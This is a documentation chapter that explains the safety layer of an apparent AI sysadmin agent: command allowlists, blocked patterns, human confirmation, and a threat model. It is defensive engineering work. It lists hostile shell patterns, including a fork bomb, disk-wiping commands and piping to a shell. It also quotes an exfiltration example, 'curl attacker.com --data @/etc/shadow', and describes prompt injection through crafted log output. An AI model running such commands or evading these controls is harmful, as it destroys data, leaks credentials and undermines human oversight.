# Chapter 5 — Safety Layer (`safety.py`)

## Why a Safety Layer?

An AI agent that can run arbitrary Linux commands is powerful — and potentially dangerous. The LLM might misunderstand a request. A malicious prompt injection attack (via crafted log output fed back to the model) might try to trigger destructive commands. Even without malice, "restart the database" needs human eyes before execution.

The safety layer is the answer. It sits between the agent and the tools, and it enforces rules that the LLM cannot override, because those rules run in Python — not inside the prompt.

---

## Three Permission Tiers

```
READ    — Always allowed. No human in the loop.
WRITE   — Requires allowlist check + interactive confirmation.
BLOCKED — Rejected immediately, regardless of context.
```

The tier is determined at **tool registration time** — when `wrap_tools()` runs during startup. The LLM never interacts with the safety layer; it just calls tools and gets results.

---

## Configuration Block

The entire configuration lives at the top of `safety.py` (lines 20–148):

```python
# Tools that require user confirmation before execution
WRITE_TOOLS = {
    "restart_service",
    "stop_service",
    "update_packages",
}

# Services that are allowed to be restarted/stopped
ALLOWED_SERVICES = {
    "nginx", "apache2", "httpd",
    "postgresql", "mysql", "mariadb",
    "docker", "redis", "memcached",
    "php-fpm", "php8.1-fpm", "gunicorn", "uwsgi",
    "cron", "postfix",
}

# Commands allowed in run_command (allowlist approach).
ALLOWED_COMMANDS = {
    # System info
    "uname", "hostname", "uptime", "date", "whoami", "id", ...
    # Files and directories (read-only)
    "ls", "cat", "head", "tail", "wc", "file", "stat", "find", ...
    # Search
    "grep", "egrep", "fgrep", "rg", "locate", "which", ...
    # Disk and filesystem
    "df", "du", "mount", "findmnt", "blkid", ...
    # Process and performance
    "ps", "top", "htop", "free", "vmstat", ...
    # Network (read-only)
    "ip", "ss", "netstat", "ping", "dig", "curl", "wget", ...
    # Logs and journal
    "journalctl", "dmesg", "last", ...
    # Packages (query only)
    "apt", "apt-cache", "dpkg", "rpm", "dnf", ...
    # Systemd, security, containers, misc
    "systemctl", "docker", "podman", "kubectl", ...
}

BLOCKED_PATTERNS = [
    "rm ", "rm -", "rmdir ", "unlink ", "shred ",       # File destruction
    "dd ", "mkfs", "> /dev/", "tee /dev/",              # Disk/device
    "shutdown", "reboot", "poweroff", "halt",           # System state
    "init 0", "init 6",
    "chmod 777", "chmod 0777", "chmod a+rwx",           # Permissions
    ":(){ :|:",                                          # Fork bomb
    "truncate ", "-delete",                              # File overwrite
    "base64 -d", "base64 --decode",                     # Encoding evasion
    "| bash", "| sh", "| /bin/bash", "| /bin/sh",       # Piped execution
]
```

All three sets can be extended at runtime via environment variables without editing source:

```bash
EXTRA_SERVICES=myapp,myworker python agent.py
EXTRA_COMMANDS=nmap,tcpdump python agent.py
```

`WRITE_TOOLS` is a set of tool names. Anything not in this set is treated as READ-only.

`ALLOWED_SERVICES` is the allowlist for the service management tools. If the agent tries to restart a service not in this list, it's denied before any subprocess runs.

`ALLOWED_COMMANDS` is the allowlist for `run_command`. Only commands whose binary name is in this set may execute. This is the primary security boundary for `run_command` — everything not listed is denied before reaching the shell. The allowlist approach is strictly stronger than a blocklist because novel/unknown commands are denied by default.

`BLOCKED_PATTERNS` is a defense-in-depth layer. If any tool argument contains one of these substrings, the call is rejected. This catches destructive arguments to *allowed* commands (e.g., `find / -delete` — `find` is in the allowlist, but `-delete` is blocked).

---

## The `wrap_tools()` Dispatcher

`wrap_tools()` (lines 224–232) is the main entry point. It iterates over the tool list and applies the appropriate wrapper:

```python
    def wrap_tools(self, tools: list, audit_logger=None) -> list:
        """Wrap a list of tools with safety checks."""
        wrapped = []
        for t in tools:
            if t.name in WRITE_TOOLS:
                wrapped.append(self._wrap_write_tool(t, audit_logger))
            else:
                wrapped.append(self._wrap_read_tool(t, audit_logger))
        return wrapped
```

The returned list is what gets passed to `create_agent()`. The agent never sees unwrapped tools.

---

## `check_command_allowlist()` — The Allowlist Gate

Before `run_command` passes anything to `bash -c`, it splits the command on pipeline/chain operators (`|`, `;`, `&&`) and checks each segment against `check_command_allowlist()` (`safety.py:151–185`):

```python
def check_command_allowlist(command: str) -> str | None:
    stripped = command.strip()
    if not stripped:
        return "[DENIED] Empty command."

    # Reject command substitution — these can embed arbitrary commands
    if "$(" in stripped or "`" in stripped:
        return "[DENIED] Command substitution ($() and backticks) is not allowed."

    # Reject process substitution <() and >()
    if "<(" in stripped or ">(" in stripped:
        return "[DENIED] Process substitution is not allowed."

    # Reject output redirection — can overwrite arbitrary files.
    if re.search(r"(?<![-\w])\d*>{1,2}\s*[^&]|&>", stripped):
        return "[DENIED] Output redirection is not allowed."

    # Extract the binary name (skip VAR=value prefixes, strip path)
    tokens = stripped.split()
    binary = None
    for token in tokens:
        if "=" in token and not token.startswith("-"):
            continue
        binary = token
        break

    if not binary:
        return "[DENIED] Could not determine command."

    binary = binary.rsplit("/", 1)[-1]  # /usr/bin/ls -> ls

    if binary not in ALLOWED_COMMANDS:
        return (
            f"[DENIED] Command '{binary}' is not in the allowlist.\n"
            f"Set EXTRA_COMMANDS={binary} or edit safety.py ALLOWED_COMMANDS to add it."
        )
    return None
```

The function blocks four categories of shell evasion before checking the binary name:

1. **Command substitution** — `$(rm -rf /)` or `` `rm -rf /` `` embedded inside an allowed command
2. **Process substitution** — `<(malicious_cmd)` or `>(malicious_cmd)`
3. **Output redirection** — `> /etc/passwd` or `>> /tmp/exfil` (can overwrite arbitrary files)
4. **Unknown binaries** — anything not in `ALLOWED_COMMANDS` is denied by default

The binary name is extracted by skipping `VAR=value` environment variable prefixes and stripping any path prefix (`/usr/bin/ls` → `ls`).

---

## `_check_blocked_patterns()` — Defense-in-Depth Normalization

Both `_wrap_read_tool` and `_wrap_write_tool` delegate to a shared helper (`safety.py:203–215`) that normalizes argument strings before checking them against `BLOCKED_PATTERNS`. This catches destructive arguments to *allowed* commands (e.g., `find / -delete`):

```python
def _check_blocked_patterns(args, kwargs, tool_name, audit_logger):
    """Check tool arguments against BLOCKED_PATTERNS with normalization."""
    str_values = [v for v in args if isinstance(v, str)]
    str_values += [v for v in kwargs.values() if isinstance(v, str)]
    for val in str_values:
        normalized = re.sub(r"\s+", " ", val.lower()).strip()
        normalized = re.sub(r"['\"`]", "", normalized)
        for pattern in BLOCKED_PATTERNS:
            if pattern in normalized:
                if audit_logger:
                    audit_logger.log_command(tool_name, kwargs, blocked=True)
                return f"[BLOCKED] Dangerous pattern detected: '{pattern}'"
    return None
```

The normalization pipeline catches three common evasion techniques:

1. **Case variation** — `val.lower()` catches `RM`, `Rm`, `DD`, `Shutdown`, etc.
2. **Whitespace tricks** — `re.sub(r"\s+", " ", ...)` collapses tabs, newlines, and multiple spaces into a single space, so `rm\tfile` and `rm  -rf` still match `"rm "`.
3. **Quote wrapping** — Stripping `'`, `"`, and `` ` `` catches `"rm" file` and `'dd' if=...`.

The check iterates over **individual string values** (not `str(kwargs)`), avoiding false matches against Python's dict/tuple repr syntax. Only actual argument content is inspected.

---

## `_wrap_read_tool()` — Audit + Blocked Pattern Check

```python
    def _wrap_read_tool(self, t: BaseTool, audit_logger) -> BaseTool:
        """Wrap a read-only tool with audit logging."""
        original_func = t.func

        @wraps(original_func)
        def wrapped(*args, **kwargs):
            blocked = _check_blocked_patterns(args, kwargs, t.name, audit_logger)
            if blocked:
                return blocked

            if audit_logger:
                audit_logger.log_command(t.name, kwargs)

            return original_func(*args, **kwargs)

        t.func = wrapped
        return t
```

`@wraps(original_func)` preserves the original function's name, docstring, and signature. Without it, LangChain would see a generic `wrapped` function instead of the original tool.

`t.func = wrapped` replaces the underlying function on the tool object in place and returns the same tool object. The LLM's tool schema (name, description, parameters) is untouched.

---

## `_wrap_write_tool()` — Blocked Patterns + Allowlist + Confirmation

Write tools now get the same blocked-pattern check as read tools, applied **before** the allowlist and confirmation prompt. This prevents a write tool from ever reaching the confirmation prompt with a dangerous argument like `"rm -rf /"`.

```python
    def _wrap_write_tool(self, t: BaseTool, audit_logger) -> BaseTool:
        """Wrap a write tool with confirmation prompt and allowlist check."""
        original_func = t.func

        @wraps(original_func)
        def wrapped(*args, **kwargs):
            # Check for blocked patterns before anything else
            blocked = _check_blocked_patterns(args, kwargs, t.name, audit_logger)
            if blocked:
                return blocked

            # Check service allowlist (only for service management tools)
            service = kwargs.get("service")
            if service and service not in self.allowed_services:
                msg = (
                    f"[DENIED] Service '{service}' is not in the allowlist.\n"
                    f"Allowed services: {', '.join(sorted(self.allowed_services))}\n"
                    f"Set EXTRA_SERVICES={service} or edit safety.py ALLOWED_SERVICES to add it."
                )
                if audit_logger:
                    audit_logger.log_command(t.name, kwargs, blocked=True)
                return msg

            # Build display string from actual arguments
            parts = [str(a) for a in args]
            parts += [f"{k}={v}" for k, v in kwargs.items()]
            args_display = ", ".join(parts) if parts else ""

            # Prompt for confirmation
            print(f"\n\033[33m⚠  The agent wants to: {t.name}({args_display})\033[0m")
            try:
                confirm = input("\033[33m   Allow this action? [y/N]: \033[0m").strip().lower()
            except (KeyboardInterrupt, EOFError):
                confirm = "n"

            if confirm not in ("y", "yes"):
                msg = "[CANCELLED] User denied the action."
                if audit_logger:
                    audit_logger.log_command(t.name, kwargs, denied=True)
                return msg

            if audit_logger:
                audit_logger.log_command(t.name, kwargs, confirmed=True)

            return original_func(*args, **kwargs)

        t.func = wrapped
        return t
```

The allowlist check runs first, but only for tools that have a `service` kwarg (like `restart_service` and `stop_service`). Non-service write tools like `update_packages` skip this check and go straight to the confirmation prompt. If the service isn't in `ALLOWED_SERVICES`, the agent gets a denial message back — explaining what happened and how to add the service. The agent will relay this to the user.

Then comes the `input()` prompt. The agent is paused here, waiting for a human keypress. Typing `y` or `yes` proceeds; anything else (including Ctrl+C) cancels and returns `[CANCELLED]`.

Three audit log statuses for write tools:
- `blocked=True` → service not in allowlist → logged as `BLOCKED`
- `denied=True` → user typed `N` → logged as `DENIED`
- `confirmed=True` → user typed `y` → logged as `CONFIRMED`

---

## Why NOPASSWD in Sudoers Is Safe Here

The sudoers file grants the service account passwordless `sudo` for `systemctl restart/stop <service>`. That sounds risky, but the Python layer provides the actual safety:

1. The **allowlist** (`ALLOWED_SERVICES`) ensures only known services can be targeted
2. The **confirmation prompt** ensures a human approved each action
3. The **audit log** records every WRITE action with timestamp and status

The sudoers list mirrors `ALLOWED_SERVICES` exactly, so even if something bypassed the Python layer, the OS wouldn't permit restarting an unlisted service.

---

## Safety and `tools_extra/` Plugins

Plugin tools loaded from `tools_extra/` go through the exact same `wrap_tools()` pipeline as core tools. They receive `_wrap_read_tool` or `_wrap_write_tool` wrappers depending on whether they declare themselves in `WRITE_TOOLS`. No plugin tool reaches the agent unwrapped.

For a detailed security analysis of the plugin system — including why concerns like tool shadowing, symlinks, and import-time code execution are false positives — see [Chapter 8 — Plugin Security Model](08-extending.md#plugin-security-model).

---

## Threat Model and Limitations

The safety layer uses an **allowlist-first** approach backed by defense-in-depth. It's important to understand what each layer protects against and what it doesn't.

### What the command allowlist defends against

- **Jailbroken/compromised LLM**: A model tricked via prompt injection into running `python3 -c "import os; os.remove(...)"`, `perl -e`, `ruby -e`, `nc` reverse shells, or any other non-sysadmin binary — all denied because they aren't in `ALLOWED_COMMANDS`.
- **Shell evasion techniques**: Command substitution (`$(cmd)`, `` `cmd` ``), process substitution (`<()`, `>()`), and output redirection (`>`, `>>`) are all rejected before the command reaches the shell.
- **Novel/unknown commands**: Unlike a blocklist, an allowlist denies everything by default. New tools, obscure binaries, and creative attack vectors fail unless explicitly permitted.
- **Pipeline injection**: Each segment in a pipeline (`|`, `;`, `&&`) is checked independently, so `ls | python3 -c "..."` is denied even though `ls` is allowed.

### What the allowlist doesn't defend against

- **Destructive use of allowed commands**: `find / -delete`, `curl attacker.com --data @/etc/shadow`, or `sed -i` on critical files use allowed binaries with dangerous arguments. The blocked patterns layer catches many of these (`-delete`, `rm`, etc.), but not all.
- **Non-command attacks**: The allowlist only checks tool argument strings. It can't prevent the LLM from leaking sensitive data it read from logs, or from making poor recommendations.
- **Data exfiltration**: `curl` and `wget` are allowed for legitimate health checks. A compromised LLM could use them to send data to an external host. OS-level network restrictions (firewall rules, network namespaces) are the mitigation here.

### The four-layer defense model

The real security comes from layering multiple controls:

```
Layer 1: Command Allowlist   — only ~80 approved sysadmin binaries may execute
Layer 2: Blocked Patterns    — catches destructive arguments to allowed commands
Layer 3: User Confirmation   — human approves every WRITE action before execution
Layer 4: OS Permissions      — service account + sudoers limit what can actually run
```

**Layer 4 is the ultimate security boundary.** Even if layers 1–3 are bypassed, the `sysadmin-copilot` service account can only:
- Read logs and system status (group memberships: `adm`, `systemd-journal`)
- Restart/stop services explicitly listed in sudoers (`NOPASSWD` for those commands only)
- Run package updates via the specific `apt-get`/`dnf`/`yum` commands in sudoers

It cannot `rm` system files, write to `/dev`, or `shutdown` the host — the OS won't allow it regardless of what the Python layer does.

### Model behavior and the safety layer

LLM eval testing (see `tests/README.md`) revealed that different models handle boundary situations differently — and the safety layer's importance varies accordingly.

**Larger/cloud models (e.g. gpt-4o-mini) tend to self-censor.** When asked to read `/etc/shadow` or restart a microwave, they refuse in text without ever calling a tool. This gives you two layers of defense: the model's own judgment plus the Python safety layer.

**Smaller/local models (e.g. llama3.1:8b) tend to attempt the action.** When asked to restart sshd (not in `ALLOWED_SERVICES`) or read `/etc/shadow` (not under `/var/log`), they call the tool and let the safety layer reject it. This is not a flaw — it's the expected behavior the safety layer was designed for. The system prompt even says "call the tool — the safety layer will handle confirmation."

The practical implication:

- With larger models, the safety layer is a **backup** — the model usually self-censors first.
- With smaller models, the safety layer is the **primary defense** — the model will try anything you ask.

**The safety layer is non-optional regardless of model size.** Even larger models can be tricked via prompt injection. But with smaller models, the stakes are higher: without `wrap_tools()`, every tool call would execute directly. Never pass unwrapped tools to the agent, and always run as the least-privilege service account (see [Chapter 7 — Installation](07-configuration.md)).

All three tested models (gpt-4o-mini, llama3.1:8b, qwen3.5) scored 5/5 on negation handling — none called `restart_service` or `stop_service` when explicitly told not to. This is the most safety-relevant eval result: the models respect "don't" even when the action keyword is present.

### Blocked pattern coverage (defense-in-depth)

| Category | Patterns | Catches |
|----------|----------|---------|
| File destruction | `rm `, `rm -`, `rmdir `, `unlink `, `shred `, `truncate ` | Direct file removal/wiping |
| Disk/device | `dd `, `mkfs`, `> /dev/`, `tee /dev/` | Overwriting devices/partitions |
| System state | `shutdown`, `reboot`, `poweroff`, `halt`, `init 0`, `init 6` | Unplanned reboots/shutdowns |
| Permissions | `chmod 777`, `chmod 0777`, `chmod a+rwx` | Opening world-writable permissions |
| Fork bomb | `:(){ :\|:` | Classic bash fork bomb |
| Find destruction | `-delete` | `find ... -delete` mass file removal |
| Encoding evasion | `base64 -d`, `base64 --decode` | Decoding hidden payloads |
| Piped execution | `\| bash`, `\| sh`, `\| /bin/bash`, `\| /bin/sh` | Piping decoded/downloaded content to a shell |

### Previously known gaps — now addressed by the allowlist

The following evasion techniques were known gaps under the old blocklist-only approach. They are now **blocked by the command allowlist** (Layer 1):

- `perl -e`, `python -c`, `ruby -e` — not in `ALLOWED_COMMANDS`
- `bash -c`, `sh -c` — not in `ALLOWED_COMMANDS`
- `nc` reverse shells — not in `ALLOWED_COMMANDS`
- `$(cmd)` and backtick substitution — rejected by `check_command_allowlist()`
- Output redirection (`>`, `>>`) — rejected by `check_command_allowlist()`
- Hex/octal encoding piped to interpreters — interpreters not in `ALLOWED_COMMANDS`

**Remaining gaps** (accepted, because Layer 4 covers them):
- `mv` to overwrite critical files (`mv` is not in `ALLOWED_COMMANDS`, but `cp` isn't either)
- `sed -i` can modify files in-place (but limited by OS file permissions)
- `curl`/`wget` data exfiltration (mitigated by OS-level network restrictions)

---

## Shell Injection Audit

Since tools execute shell commands via `subprocess.run()`, it's worth documenting where user-controlled input flows into those commands.

### `run_cmd()` — the subprocess helper

All tools use `run_cmd(cmd, timeout)` which calls `subprocess.run(cmd, ...)` with a **list** argument. This means `subprocess` uses `execvp` directly — no shell interpretation, no injection risk — *unless* the list is `["bash", "-c", some_string]`, which does invoke a shell.

### Code paths through `bash -c`

**`run_command` — freeform shell** (`tools.py:822–865`): Takes a user-supplied `command` string and runs `bash -c {command}`. Bare `cd` commands are intercepted and handled via `os.chdir()` instead (see [Chapter 4 — Tools](04-tools.md#bare-cd-interception)). Before execution, each segment in the command pipeline is checked against `ALLOWED_COMMANDS` via `check_command_allowlist()`, which also rejects command substitution, process substitution, and output redirection. The blocked patterns layer provides additional defense-in-depth, and OS permissions further constrain what can run.

**4 tools use `shlex.quote()` on user parameters:**

| Tool | User parameter | How it's quoted |
|------|---------------|-----------------|
| `read_log_file` | `path`, `grep` | `shlex.quote(grep)`, `shlex.quote(path)` |
| `check_dmesg` | `level` | `shlex.quote(level)` |
| `check_directory_size` | `path` | `shlex.quote(path)` |
| `find_recent_files` | `path` | `shlex.quote(path)` |

These are safe against shell injection — `shlex.quote()` wraps the value in single quotes and escapes any embedded quotes.

**Hardcoded `bash -c` calls** (no user input in the command string):

- `check_cpu_and_load` — `lscpu | grep ...` (hardcoded)
- `check_top_processes` — `ps aux --sort=... | head -n {count}` (`count` is an `int`, not injectable)
- `find_zombie_processes` — `ps aux | grep -w Z | grep -v grep` (hardcoded)
- `check_cron_jobs` — `for f in /etc/cron.d/*; ...` (hardcoded)
- `system_audit` — all `_run()` calls use hardcoded strings or `int` parameters
- `check_outdated_packages` — all `_run()` calls use hardcoded strings
- `update_packages` — commands from a fixed `dict`, not user-composed

### Tools that don't use `bash -c`

The remaining tools pass arguments as list elements directly to `run_cmd()`:
- `query_journal_logs` — `["journalctl", "-u", unit, ...]`
- `check_disk_usage` — `["df", "-h", path]`
- `check_service_status` — `["systemctl", "status", service, ...]`
- `restart_service` / `stop_service` — `["sudo", "systemctl", "restart", service]`
- `check_open_ports` — `["ss", "-tulnp"]`
- `ping_host` — `["ping", "-c", str(count), host]`
- `dns_lookup` — `["dig", "+short", domain]`
- `check_url_health` — `["curl", ..., url]`

These are safe — list-form `subprocess.run()` doesn't interpret shell metacharacters.

---

Next: [Chapter 6 — Audit Logger](06-audit-logger.md)
